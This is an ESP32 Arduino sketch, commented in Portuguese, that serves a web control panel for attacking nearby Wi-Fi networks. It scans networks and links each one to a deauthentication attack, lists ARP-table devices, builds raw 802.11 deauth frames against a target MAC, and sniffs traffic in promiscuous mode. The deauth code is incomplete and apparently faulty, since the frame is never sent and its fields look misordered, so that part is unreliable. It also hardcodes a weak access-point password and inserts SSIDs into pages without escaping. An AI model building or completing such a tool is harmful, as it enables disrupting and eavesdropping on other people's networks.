#include <WiFi.h>
#include <WebServer.h>
#include <lwip/etharp.h>
#include <esp_wifi.h>

// Credenciais do AP
const char* ap_ssid = "ESP32";
const char* ap_password = "1234567890";

// Cria o servidor http
WebServer server(80);

// Variáveis do Deauth
String targetSSID = "";
int targetChannel = 1;
uint8_t targetMac[6];

// SSID e senha para se conectar a um wifi
String ssid;
String password;

// Configurações do AP
void setupAP() {
  Serial.println("Starting AP...");
  WiFi.softAP(ap_ssid, ap_password);

  // Rotas HTTP do AP
  server.on("/", handleRoot);
  server.on("/connect", handleWifiConnect);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.on("/scanner", handleWifiScanner);
  server.on("/deauth", handleAttackDeauth);
  server.on("/arp", handleARP);
  server.on("/cap", capture);
  server.begin();

  Serial.println("Servidor HTTP inciado...");
}

// Configurações da Pagina Root
void handleRoot() {
  String htmlRoot = "<html><head><title>ESP32 | Root</title><style>html {background-color: black;color: purple;display: flex;}a {color: red;}</style></head><body><h1>ESP32 : Configuracoes</h1><h2>Paginas : </h2><a href='/connect'>Conexao WiFi</a><br><a href='/scanner'>Scaner WiFi</a><br><a href='/arp'>Scaner ARP</a><br><a href='/cap'></a></body></html>";
  server.send(200, "text/html", htmlRoot);
}

// Configurações da Pagina de Conexão
void handleWifiConnect() {
  String htmlConnection = "<html><head><title>ESP32 | Conexao WiFi</title><style>html {background-color: black;color: purple;}input {background-color: black;color: purple;}</style></head><body><h1>Conexao WiFi : Configuracoes</h1><form action='/submit' method='POST'>SSID : <input type='text' name='ssid'><br>Senha : <input type='password' name='password'><br><input type='submit' value='Conectar'></form></body></html>";
  server.send(200, "text/html", htmlConnection);
}

// Recebe as Credenciais de login da rede
void handleSubmit() {
  ssid = server.arg("ssid");
  password = server.arg("password");

  String message = "Tentando se conectar a SSID : " + ssid;
  server.send(200, "text/html", message);

  delay(1000);
  WiFi.softAPdisconnect(true);
  connectToWiFi();
}

// Conecta o ESP32 a um WiFi
void connectToWiFi() {
  WiFi.begin(ssid.c_str(), password.c_str());

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConectado ao WiFi");
    Serial.println("IP : ");
    Serial.print(WiFi.localIP());
    startWebServer();
  } else {
    Serial.println("Falha ao conectar ao WiFi");
    setupAP();
  }
}

// Inicia/Reinicia o Servidor HTTP
void startWebServer() {
  server.on("/", []() {
    server.send(200, "text/html", "<h1>Conectado a WiFi!</h1>");
  });
  server.begin();
  Serial.println("Servidor HTTP iniciado!");
}

// Configurações do Scanner Wifi
void handleWifiScanner() {
  int numNetworks = WiFi.scanNetworks();
  String htmlScan = "<html><head><title>ESP32 | WiFi Scan</title><style>html {background-color: black;color: purple;}a {color: red;}</style></head><body><h1>WiFis Proximos</h1><ul>";

  for (int i = 0; i < numNetworks; i++) {
    htmlScan += "<li><a href='/deauth?ssid=" + WiFi.SSID(i) + "&channel=" + String(WiFi.channel(i)) + "&mac=" + WiFi.BSSIDstr(i) + "'>" + WiFi.SSID(i) + " (Canal : " + String(WiFi.channel(i)) + ")</a></li>";
  }

  htmlScan += "</ul></body></html>";

  server.send(200, "text/html", htmlScan);
}

// Configurações do ARP
void handleARP() {
  String htmlArp = "<html><head><title>ESP32 | ARP</title><style>html {background-color: black;color: purple;}</style></head><body>";
  htmlArp += "<h1>Dispositivos conectados : </h1><table border='1'><tr><th>IPv4</th><th>Endereco MAC</th></tr>";

  size_t i = 0;
  ip4_addr_t *ipaddr;
  struct netif *netif;
  struct eth_addr *eth_ret;

  while (etharp_get_entry(i, &ipaddr, &netif, &eth_ret) == 1) {
    if (ipaddr != NULL && eth_ret != NULL) {
      htmlArp += "<tr><td>";
      htmlArp += IPAddress(ipaddr->addr).toString();
      htmlArp += "</td><td>";
      htmlArp += formatMacAddress(eth_ret->addr);
      htmlArp += "</td></tr>";
    }
    i++;
  }

  htmlArp += "</table></body></html>";

  server.send(200, "text/html", htmlArp);
}

// Deauth função1
void deauthAttack(uint8_t *targetMac) {
  for (int i = 0; i < 100; i++) {
    sendDeauthFrame(targetMac);
    delay(10);
  }
}

// Deauth função2
// NOTA: O Esp32 requer um tratamento especial para pacotes de desautenticação
void sendDeauthFrame(uint8_t *targetMac) {
  uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01,
    targetMac[0], targetMac[1], targetMac[2],
    targetMac[3], targetMac[4], targetMac[5],
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x07, 0x00
  };

  // Você precisará implementar a função de enviar os pacotes
  // Você precisará de bibliotecas externar ou até bibliotecas personalizadas para isso
}

// Deauth função3
void handleAttackDeauth() {
  if (server.hasArg("ssid") && server.hasArg("channel") && server.hasArg("mac")) {
    targetSSID = server.arg("ssid");
    targetChannel = server.arg("channel").toInt();
    String macStr = server.arg("mac");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMac[0], &targetMac[1], &targetMac[2], &targetMac[3], &targetMac[4], &targetMac[5]);

    // NOTA: Você precisará mudar manualmente o canal
    // Você também precisará implementar a função de troca de canal
    // O que precisará de bibliotecas externas

    deauthAttack(targetMac);

    server.send(200, "text/html", "<html><body><h1>Atacando : " + targetSSID + "</h1></body></html>");
  } else {
    server.send(400, "text/html", "Parametros invalidos");
  }
}

// Formata MAC
String formatMacAddress(uint8_t *mac) {
  String macStr = "";
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) {
      macStr += "0";
    }
    macStr += String(mac[i], HEX);
    if (i < 5) {
      macStr += ":";
    }
  }
  return macStr;
}

// Configurações de Captura
void capture() {
  if (WiFi.status() == WL_CONNECTED) {
    esp_wifi_set_promiscuous(true);

    esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
      wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
      uint16_t len = pkt->rx_ctrl.sig_len;
      uint8_t *data = pkt->payload;

      for (int i = 0; i < len; i++) {
        Serial.printf("%02X ", data[i]);
        if ((i + 1) % 16 == 0) {
          Serial.println();
        }
      }
      Serial.println("\n");
      Serial.print("Pacote Capturado - Tamanho : ");
      Serial.print(len);
      Serial.println(" bytes");
      Serial.println("\n");
    });

    Serial.println("Modo Promiscuo Ativado. Capturando Pacotes...");
    server.send(200, "text/html", "<html><body>Modo de Captura Ativado!</body></html>");
  } else {
    server.send(400, "text/html", "<html><body>Conecte-se a um wifi antes de ativar a função de captura</body></html>");
  }
}

void setup() {
  Serial.begin(115200);
  setupAP();
}

void loop() {
  server.handleClient();
}
